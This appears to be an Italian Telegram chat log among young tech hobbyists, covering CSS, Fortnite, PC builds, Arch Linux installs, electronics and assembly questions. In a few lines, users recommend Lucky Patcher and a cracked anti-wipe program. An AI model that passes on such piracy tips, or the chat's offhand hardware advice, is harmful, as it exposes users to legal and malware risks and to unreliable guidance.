ora un attimo che Switchando è impazzito e mi è andato in "cpu leak" o non so come definirlo, quando consuma costantemente il 100% di CPU facendo freezare il resto di Windows
denunziali
Raga qualcuno mi aiuta col css? 
Giovedì 24 Maggio 2018
Ore 10:00
Aula U14-T023

Fabio Panada, Cisco Senior Security Consultant, presenterà un workshop dal titolo "Cisco Cybersecurity"
Il Workshop è incentrato sulle tecnologie di cybersecurity ed è
rivolto a studenti dei corsi di laurea e laurea magistrale del
Dipartimento di Informatica Sist. e Com. dell’Università Bicocca di Milano.
Se siete interessati ahaha
io so il c++ 
Nooooooo
C slus slus
volevo prenderlo
qualcosa in css la so
Che css e una versione modificata di c?
è il c per web
Il c dei pro
il c è da noob
ahh no quello è il batch
Si ahaha
xD
Css  = c sucks sucks
Disclaimer non insulto nessuno
Si ma non riesco a fare il sito mobile responsive
Mbeh? Provate a dire che il vostro PC fa troppo schifo per giocare, adesso!



il mio tutto al minimo andava a 4fps :I
(non raspi, pc)
Fortinite ?
invece ora con il fisso non ne sono sicuro ma credo di fare circa 100/120 fps tutto epico
Quando ci sono i bug e non supporta l'OTA
Notare l'hub sulla scala
Dimmi che nel video spieghi come hai fatto 
mi hai fatto venire l'hype proprio per questo 
Ovvio
Hai già editato il video?
Nup
Piccolo spoiler
Fps??
2-3
1080p con grafiche maxate, 30fps stabilissimi
Woow

C'è ovviamente una magia hardware/software che scoprirete nel video... Ed è such wow
☺️
Gpu esterna 
scheda video usb esterna, come minimo 
ecco 
Avercela
Lool
Nono, spesa 0€ proprio
Neanche un adattatore
La puoi sempre rubare una gpu 

Io lo so
 tu conosci il css?
Te lo scrivo sul gruppo patroen
ma.....
è uno scherzo?
Parsec?
giustooo
Non è il primo aprile
lo so leggere ma non scrivere
 
Mi aiuti a rendere il mio sito mobile responsive? 
non lo so scrivere, non so come fare 
Il problema è che siamo in due 
se ho un codice fatto davanti so dirti cosa fa, ma non so neanche da dove partire se dovessi scriverlo io
ahh
è tipo Marco con il Python
io ancora non sono riuscito ad usarlo aprsec
Se è parsec mi sparo
Posso rubarlo da 
? 

ma non penso, non avrebbe senso
In quanto tempo arrivano i pacchi di gearbest?
chi tel'ha detto
c'è proprio parsec per raspi 
quello non è riuscire a giocare sul raspi, è usare il raspi per """streammare un video""" dal pc
 sgamato 
AHHAHAHAH
Il più geniale volume slider che abbia mai visto
blxm
Ecco dove young signorino prende i testi delle sue canzoni... 
Che scimmia ragazzi ahah
AHAHAHAHAHAH
HAHAHAHAHAHAAHAHAHHAHAHAA
adesso aggiungo un file nascosto chiamandolo "rappapapapapa"
Ehilà gentaglia!
Qualcuno ha uno schema per creare un'estensione per striscia led rgb con mosfet?
Hahahahhahahahahahhahashahahhahahahhahahahahhahahshhahahshshahhs
98% Parsec  1% il coso di Steam
(Tralasciando che Fortnite PC gira solo su Windows e fa soffrire il mio 6600K, quindi deduco non sia Fortnite PC, ma mobile?) 1% console emulator
Mi fai salire una scimmia
27 euro
Rumor del Mi 8
Che dite... 4000mAh, una giornata la fa? 
Beh i redmi 5 hanno 4000mAh
tutti quelli che hanno un google home:
ditegli: ok google, prendi un numero da 1 a 23 
e poi scrivetemi cosa vi dice
E Google assistant?
anche
3
va bene qualsiasi dispostivo avente a bordo google assistant
ok, altre persone?
10 
Posso andare avanti un bel po' 
ok, scrivimeli  tutti in privato
Ma lo puoi fare anche tu 
devo vedere il parere degli altri google assistant
Ma...
Poi come hai fatto a installare fortnite che non c'è per linux
Si potrebbe risolvere con un emulatore? Forse?
6
Ragazzi per caso sapete come convertire un programma di intelligenza artificiale in Python in codice Arduino?
secondo te arduino regge un AI
Era tanto per sapere
Scusa
Sono un po’ principiante
Ecco perfavore
Mi aiuti con l’ultimo punto di questo
Solo l’ultimo
Perfavore è importante
sto finendo di scaricare
ma il prezzo degli elettrodomestici qual'è?
È una verifica?
probabile
Ricerca iteranto su tutti gli elementi, è la cosa piu facile non sapendo come sono strutturati i dati
Sarà Fortnite mobile/console
, sta batteria non mi convince
*badum-tss*
\ban
ma che cazz  non é che hanno personalità diverse
.rand 13 72772
7392
Che fiko
Userbot?
Yep
Funziona solo con il mio id xD
Almeno nei gruppi non te lo mandano a belle baldracche
 sto per fare una grandissima stronzata
Ossia?
Installare arch
Se alimento una ventola 12 v con un alimentatore 19v si brucia?
Indovina?
Bravo
Bravo un cazzo, ma sicuramente andrà a puttane  il PC come l'altra volta, lo sento
Ma non si sta bruciando ancora 
Ed è accesa da quasi un minuto 
.
Stai sperimentando? Non ho capito 
Eh?
Ho riscritto
E poi io metto Ubuntu perché voglio la pappa pronta
Volevo raffreddare il PC ho trovato queste ventole vecchie a 12 v è l'unico alimentatore a portata di mano è lo stesso del PC 
la sensazione quando puoi andare alla scuola dei tuoi sogni ma non ci vai per certi questioni importanti 
Non mi sembra una buona idea 
*certe

k
ahhahahh
12 o 19?
la sensazione quando non capisci un cazzo di cosa ce scritto lol
Variabili d'ambiente
Per girare gira, anche più veloce ma si usura più velocemente perche non è realizzata ver quel voltaggio
ok,faro finta di capire 
secondo voi quanto tempo mi ci vorra per finire il libro se sto nella pagina 400 e mi mancano altri 400 e ora sto studiando ifstream /ofstream/fstream? non so la difficolta delle nuove teme per questo chiedo .-.
pronto a domani?
No
io manco
copiamo a vicenda
* marco

io non l'ho mai capita la geografia
se mi va bene prendo 6
*4
se mi va male 4
in entrambi i casi addio pc nuovo 
*2
siete divertentissimi 
alle medie fortunatamente non mettono 2
ciao! avrei bisogno di un aiuto....ho necessità di far usare il computer ad alcuni amici esclusivamente per spotify (lol)...ho modo di bloccare l'accesso all' account ospite che ho creato (win10) ai vari file in C e D ovvero ssd con win e hdd?
gente, credo di aver appena trovato, dopo un trip mentale assurdo di storia dell'arte, l'apoteosi dei video nonsense e fichissimi
 dopo ardue ricerche l'ho trovato, IL video più nonsense mai creato
ma in generale il canale intero
Ho perso lo sfondo, percaso windows lo salva in qualche cartella? 
se l'hai cancellato mi dispi
Ubuntu invece lo salva da qualche parte?
12 la ventola 19 l'alimentatore
Ah okok
Ha senso 
Grazie 
Di niente
Non lo posso più recuperare?
No sarebbe stata diversa la schermata
Ma solo l'unico che di Fortnite ha sempre sentito solo il nome?
No
Io ci ho giocato, ma non è proprio il massimo
Non ti perdi nulla
Ma manco visto cosa sia
Non so nemmeno di che si tratta 
È una "copia" di battleground
Ehm.
Però è "cartoonesca" e non si possono usare i veicoli
Manco quello conosco 
Devi sopravvivere fra 100 persone
(ci sono anche i team)
Prova su un pc che non ti interessa, esperienza personale
No, grazie a Dio
anzi Cicca, sentiti lui
Meh
sparati .-.
Meno male che hai aggiunto la faccina
L'uomo dal warn facile

*canc*
A cicca sta sulle palle Montemagno
ah, dimenticavo che a Cicca stanno sulle palle tutti gli youtuberz 
Bannat- 
Quindi anche overVolt? 
Come Casey, come buonanno, come GaryVee, come Thanatos, come qualsiasi youtuber in realtà 
Esatto
sentito Marco, Cicca ti tradisce
lui ha detto che è speciale 🤷‍♂
Solo a me telegram va male sta sera?
nop, è identica
Guarda che Fortnite è praticamente l'unico gioco ad essere perfettamente uguale su tutte le sue piattaforme
l'unica cosa è che mobile e console hanno dei limiti riguardo i dettagli della grafica e il framerate
Spacewar! 
Ha una sola piattaforma
?
a me va benissimo
allora è un problema di tim/telecom infatti telecom e tim la da come down
Amo sempre di più whatsapp
A me di punto in bianco si è messo a cancellarmi i messaggi
Mi diceva "Elimina messaggi (100 di 1758)" e non mi andava più avanti 
\ban
Non ho così tanti PC 
vm
Ciao, in realtà non sono nuovo, ho cambiato profilo
Valentino!
Il vincitore del Fs-T6!
Ciao!
Quest'anno ho l'esame di 3° media e all'orale vorrei portare come argomento principale l'informatica: avete in mente dei collegamenti con le altre materie? In storia porta la terza rivoluzione e industriale.
Ecco chi è che rovina la società, non i cheater, ma i ragazzini che accusano di cheat chiunque sia più forte di lui.
ahhahah
Arduino: parli della produzione, tra l'altro italiana, la colleghi a quasi tutto, materiali, produzione, funzionamento... se in scienze avete fatto gli elettroni (non penso, si fa alle superiori, ma vabbè) puoi collegarlo pure a quello
Ecco come, il nostro team da adesso si troverà sempre a giocare con gente che è stata segnalata tante volte, quindi possibili troll e cheater
Quindi con cheater
GG
Quando noi siamo un team che tenta di giocare seriamente e viene accusato di cheat quotidianamente
Oh grazie, comunque si, ho fatto l'atomo, il problema più grande sta nel collegare l'argomento con le lingue
Che noia, noi facciamo solo le cose più brutte (secondo me)
Esempio: scienze abbiamo fatto il corpo umano, ma la genetica l'abbiamo saltata perché era "difficile"
sempre scienze, abbiamo fatto il Sistema Solare ma non abbiamo fatto i pianeti -.-
questo è simpatico come un chiodo in un occhio
Lol
Elettrocalamita fatta in casa (regge 2v)
bene, per fortuna ne regge solo 2 altrimenti esplode il mondo
?
stavo scherzando
Ho provato un po’ di più tipo 2,5 ma ha troppo assorbimento e va in corto
ma ogni volta è saltata la corrente?
no, ho un alimentatore che ti segna il corto circuito
ESKEREEEEEEEEEEEEE sono tornato merde
Benvenuto!
buonasera e grazie
arrivano piu velocemente i pacchi da banggood o da gearbest?
No
Sono esercizi
No
Se guardi l'immagine che c'è su instagram
Il mobile non la ha
This
Puoi anche semplicemente scollegare l'hard disk e usarne uno scrausissimo da 8gb del secolo scorso
Di solito ci vuole circa un mese, dipende dalla spedizione che hai scielto (e dal tuo servizio postale). Comunque ci impiega molto meno di Aliexpress e Wish che a volte devi aspettare dai 2 ai 3 mesi (se sei fortunato  - esperienza personale).
Sto provando in vm
Io sto aspettando un pacco da Wish da 6 mesi
  prima prova su vm....fallita
Lascia stare vm
Vai di computer vecchio
Installare arch è una cazzata, il problema è in caso farlo funzionare bene
This.
Buongiorno Makers
Molto rassicurante 
Eh ma non ho un PC vecchio a casa
hai un'hard disk vecchio?
'giorno 
Neanche, sono tutti pieni 

l'unica é riprovare in VM stando attento a settare tutto bene, altrimenti fatti un bel backup di Windows e prova sul tuo pc
Compra un hd
Hai una usb?
Attenzione che io ho distrutto il bootloader di Windows per installare Arch 
Bello 
AHAHAHA
Il tuo 
e poi ci sono io che sono riuscito a distruggerlo con 
... fiero
L'ho comprato a settembre 🤷‍♂️
Impossibile
Ricordo
AHAHAHAHAHAH 
Eh te ridi.....io bestemmio
è una sfida?

Ehh, è una tappa necessaria
Ma mica fondamentale!
Si 
Si io conosco thanos the napolethanos xD
Sì quando lo rimuovi e rimane GRUB 
Buongiorno a tutti
buongiorno
sapete come si cambia il background di CodeBlock?
Editor war incoming
nopn trovo war
Scherzi?
no
...
vado in Setting> Editor >.........
Traduco il mio messaggio di prima:
🤦‍♂️
trovati
ecco 
Ahahaha anche a me è successo con arch, la stessa cosa 
Ciao ragazzi, sto facendo una build abbasatanza scattante per ufficio e dopo un po' di ragionamenti (e grazie anche al consiglio di uno di voi, ieri) ho modificato la lista dei pezzi, sono arrivato a questa conclusione e vorrei avere un vostro ultimo parere prima di procedere con l'ordine :)

cpu AMD Ryzen 5 2400G 3.6GHz 2MB L2 
mobo Gigabyte GA-AB350M
ram Corsair Vengeance LPX  (2 X 4 GB), DDR4, 3000 MHz, C15 XMP 2.0, Rosso
ssd amsung MZ-V6E250BW SSD 960 EVO, 250 GB, M.2
power be quiet! BN261 350W ATX

(Il case che ho già è per un microATX)
Non posso vedere adesso i componenti però basta che sei sicuro di prendere
1 pezzi compatibili
2 di qualità
3 fare una build per ciò che ti serve
4 assicurarti che ci sta tutto nel case
5 quando vai a montare fai un buon airflow e in generale prendi un buon sistema di dissipazione
Ma riparte cmq
"OverVolt HQ" 
Dovrei veramente mettere overVolt sul campanello, finché ci sono cinesi che mi spediscono roba
Wow ce un prog che se lo hai nel pc,se wanna cry crypta i file lui puo battere wanna cry se fate un riavvio poi difende il pc dagli bimbi che amano cancellare i file dal pc
Ehm..
MADONNA QUANTO HA RAGIONE
un altro giorno, poi scade il termine e quindi finiranno anche ste strac***o di mail
Quante te ne sono arrivate?
Ogni sito a cui sei registrato è stato costretto ad adeguarsi
Eh il GDPR sta facendo magie
78282648
ora...tralasciando le aggiunte che stanno apportando a telegram, vogliamo parlare di quello sfondo?
no perchè se il livello dei programmatori di telegram è a quello sfondo io gli vado a rubare il lavoro
Stavi a finire gli int
cmq ciao gienta
32767+1 e puf esplode Arduino
oggi ho fatto la verifica di SDA, vado a suicidarmi
sei nuovo? Benvenuto!
addio
ma 
dove abiti? MAGARI trovo qualcuno che abita vicino a me, TIPO dall'altra sponda del monte, PER ESEMPIO

e in tutto questo dobbiamo ancora vederci
beh per domani ho solo da studiare per interrogazione di filosofia(manco solo io e pochi), inglese e biologia...che si traduce in "vado su payday, ci si vede alle 2 di notte"
probabilmente ci incontreremo a roma alla maker faire tipo
*sta?
SDA
Storia dell'arte
SDT (scienze della terra) l'ho già fatta, manca biologia fisica matematica e ancora un paio di materie
Tipo l'ultima e penultima settimana ho solo che verifiche...
 quando esce il video del rasp
sabato, a logica
Venerdì invece 
Cioè domani
ma che 
Niente va a logica con 
Ore?
Che belli i team che lavorano, quelli seri
We've updated our Privacy Policy but you can't see it because we haven't got a website nor a Privacy Policy


Dobbiamo pubblicare assieme con Than hahah
quindi neanche l'ora va a logica?
Ah boh 🤷‍♂️
Non lo so, vedo se riesco a finire il video entro oggi
dimenticavo 
Ecco 
 
coff coff
è da Pasqua che andiamo avanti con sta cosa 
Raga ci sono dei soft android anti_pubblicita? Sto urlando ogni secondo pubblicita nel cell,gioco google o YT,con wifi o senza
elimina la cache e togli il wifi, la pubblicità non può andare
potresti usare Lucky Patcher ma assolutamente non con youtube
Figo! Documentazione?
come capito raccoglie tutto in un suo disco virtuale ,e quando riavvii tutto torna come prima
Si, hai qualche sito/link/file?
Non ricordo il nome,tra 10 min finisco i compiti e ti dico
Megaspoiler
 posso aiutarti con la nuova serie di domotica?
questo è quello che ho fin ora, ho preso su banggood sensori, pulsanti etc
Abbiamo l'esclusiva 
 fidati, è una figataaaaaaaaaaaaaaaaaaaa
Puoi scegliere così pochi colori?
volete mettere?
pochi? è una tavola
ah, posso scegliere effetti etc
Ma non ha tutti i 16,7 milioni di colori
posso metterli tutti
ma nn li usero mai tutti ovviamente
solo adesso arriva?
Ma se ne sto parlando da mesi
Sai, essendo malato di broncopolmonite da un mese posso fare poco
ah, mi dispiace
si chiama Shadow Devender il prog
 sta visualizzando?
funziona bene anche il crackato(io non ho provato,cera nel vid di un ragazzo che lo fido piu o meno)
Una colla che resiste all'acetone?
Il cemento
se magari smetti di taggarlo ti risponde, non è che sta 24h/24 sul telefono
non per essere antipatico, ma evitate di rompergli le scatole ogni 20 secondi
hai pagato 25 euro per metterla sul play store seriamente? fiiigo comunque
Nop
Non ancora, infatti non è disponibile al pubblico
ah, se la metti privata è gratis?
Non proprio, vabbè è complicato
Ma è tipo un web browser che carica switchando only?
Io avevo switchando ma me ne sono andato
Si ma è a lezione
Onestá
Comunque se ci tieni ad installarla in esclusiva...

Quando puoi/vuoi guarda i messaggi prima
E vai qua
❤️
Va ancora ottimizzato perché ci mette quasi un minuto ad installarla
si ma salvare nella home != avere un'app 
(per ora funziona solo con Chrome per Android, non provare con altri browser)
E invece
Tu fallo e poi dimmi 
Ma scusa ora hai fatto solo un pannello di login?
I server di Play Store compilano la progressive web app come .apk e te la mandano sul telefono
Infatti se ti diverti con un file explorer puoi trovare il .apk
O c’è tutta l’interfaccia
ODDDIOOOOOOOOO
VISTO ADESSOOO 
^
Con anche il backend
Ah
Con cosa è sviluppato?
Cioè, se i dati che metti sul login sono veri te lo dice
Come mi iscrivo al cloud?
La UI in HTML puro, e JavaScript ovviamente
comunque, la spunta su "Keep me logged in" fa un po' cagare a essere sinceri
Il backend in C#
o è il mio telefono che ha rovinato tutto?
Ancora non puoi, ti avevo scritto l'altro giorno come partirà la beta
Probabilmente
1. Io non sono un web designer, 2. Quella schermata l'ha fatta Ale qualche mese fa, io ci ho aggiunto la scritta cloud e il campo nickname sopra
Ma io posso modificare una pagina di login di Nextcloud?
E che ne so
Se non sbaglio è php, quindi dovrebbe essere abbastanza semplice
Conoscete un bravo web dev?
in YAMDF non c'è una checkbox material? (e taggo 
)
Non usa YAMDF quella pagina
ah 
Se Francesco non lo finisce e non ce lo esce 
mi sembrava mancassero ancora un botto di robe da fare
Io non ho i source di YAMDF come lui non ha quelli della prossima versione di Switchando
wait, yamdf non era open source?
Sì ma... Non è che pusha ogni secondo della sua vita
Diciamo che non pusho proprio
Come io con Switchando, faccio i commit solo dopo aver rilasciato la versione anche precompilata
Non erano perfetti, ma li avevo fatti
Esatto
Ultimo commit 21 febbraio, bello
In realtà considerando che é uscito l'MD2 é un bene
Comunque per ora quel pannello è fatto con mdl
Cosi non devo rifare millemila robe
Che è un Framework di Google abbandonato, ed è il vecchio material design
Effettivamente sì
Pensavo di riuscire a fare qualcosa in queste due settimane di pausa dal corso ma quanto pare non ho tempo lo stesso
Tipo oggi per i patreon??
Qualcuno conosce un gimbal molto piccolo e leggero, con videocamera integrata?
Devo ancora editare lolz
Peccato...
Lol
Non puoi rimediare HDD ad un prezzo basso?? Tipo HDD usati..
Che scheda madre mi consigliate a basso prezzo e per un i5 8600k??
Budget?
120?
130
Ho iniziato un nuovo progetto per una gimbal stile osmo per una reflex da 700/900gr
Perche per 40 euro prendo un 8600k invece di un 8500
E la build è da 1100€
Aah
Mini itx o ATX?
Atx
Ho visto quella della gigabyte
Le Msi tomhawk te le sconsiglio perché il BIOS puzza
Ok
Entry level, non puoi occare bene
E ho visto la asus prime p
È un po' sopra il budget ma sulla mobo non risparmiare
Ok
Ma se il case ha 2 porte usb 3.0 ha bisogno di 2 connettori 3.0 sulla mobo?
Dipende dal case
Ti posso scrivere in privato?
Anche il mio ha 2 3.0 ma ha bisogno di un solo connettore
Certo
Prendo questo
Credo di sì
Poi comunque tutte le mobo su quella fascia di prezzo hanno due porte per le 3.0

ragazzi qualcuno che mi può aiutare con un problema che ho ho in assembly per motorola 68000.
problema: praticamente definisco il contatore con 
DC.W  5 (in teoria questo comando definisco una costante cioè 5) poi la metto nel registro D0 e fin qui tutto bene.
quando controllo il registro D0 invece di vedere "00000005" vedo "00005000" non  vedo l'errore 
grazie in anticipo
Reffato vero? ☺️
Marco tu puoi vedere se ho usato il referreal?
Quanto incassi con 1200€ di prodotti comprati con il link referrato?
??🤨
ahia
Telegram down?
Si, ma solo 5 minuti
42€ che altrimenti andrebbero ad Amazon
boh, su 
 continuano ad aumentare
Sì
3.5% su elettronica
Rega consigliate canali dank su telegram?
e io continuo a non riuscire ad inviare messaggi 
Ma noi stiamo chattando 🤔
eh sí, magari hanno avuto un black out di nuovo ma poco tempo fa si erano equipaggiati con degli ups
I bot dei canali quando telegram si freeza
potrebbe spiegare il down temporaneo
e invece Scontino é bravo e funziona lo stesso 
Aumenta i bit xD
Chi sta seguendo?
Io no perché non mi hanno cagato per mail
Invidioso
io no perchè ho la 128 kbps per ora
Hahahaha manco a me
Ehehe qui è arese
Lo sapevo da 1 settimana io 🤣🤣
opporc*
ok rimediato, ma si può togliere sta cazzo di traduzione simultanea che mi fa salire il nervoso?
No purtroppo
Si guarda
madò mi sta venendo voglia di trovarla questa e spaccargli la tastiera in testa
Lasciamo stare
DDIO
vai a leggere i commenti, fast
Peccato non ho visto mi drone :(
Tranquillo...
Era per i 4 asterischi
Ed é per questo che non ti ho warnarto. A quanto pare il big Boss é stato più severo
Non arriverà mai
In italoa per me
Probabilmente vero, non sarà certificato
Appunto
Credo di essermi innamorato di node.js
Così tante liberie 
É praticamente python fatto meglio
Utile per lo sviluppo web
Wow
* post su ignuranza incoming *
perché?
Mi date indicazioni di quale modello Sonoff Touch prendere?
US
quello americano insomma
Tnx
Perché li fanno sempre quando si parla di queste cose
ma non ha senso
cioè cosa c'è di male se ti piace un linguaggio
Perché qualcosa in questo mondo ha senso ?
sì?
La mia , la tua esistenza ha un senso ?
L'umanità ha un senso ?
Python ha un senso ?
Ok lo ammetto ho fumato troppo
SÌ.
meglio C# 
Node = python + Bella sintassi
Io conosco un pochino di Assembly x86, non conosco l'architettura di un Motorola 68000, mai usato. I valori che hai scritto sono in formato esadecimale? Avrei un'idea
si ma
evita
di scrivere
384816 messaggi 
così

Mghhmghhh 
 Impazzisco
Raga ci siamo dati ai gameplay
Ok
Ci
Proverò

Il fumo ha senso?
Yep
Nope
 che gioca a Fortnite? É arrivato il momento di disiscriversi
E comunque scommetto quello che vuoi che hai fumato almeno una volta della vita pure tu
ma Fortnite è bbello
Non ho bisogno di fumare, sono fumato già di mio
e il mio PayPal purtroppo lo conferma
Ecco vedi
Diciamo che é una gran trovata commerciale. Il gioco in se non mi piace per niente
Secondo me è più bella una cosa come battleground
:(
e pensare che avrei avuto i soldi per il Mi Mix
Pazzo
oh con 10€ ti danno il pass per 3 mesi
se giochi tanto arrivi ad avere il 120% velocità in più nel salire di livello e sbloccare le skin (comunque solo vantaggi estetici)
Se lo disinstalli te lo fanno a vita
Comunque, ognuno gioca a quello che vuole, ovviamente. A me non piace
ma il bello è che ne sto approfittando per controllare il bilancio, e ho comprato roba di cui mi ero dimenticato
Ma se ha successo i suoi motivi ci saranno, e li ha elencati Montemagno in uno dei suoi ultimi video
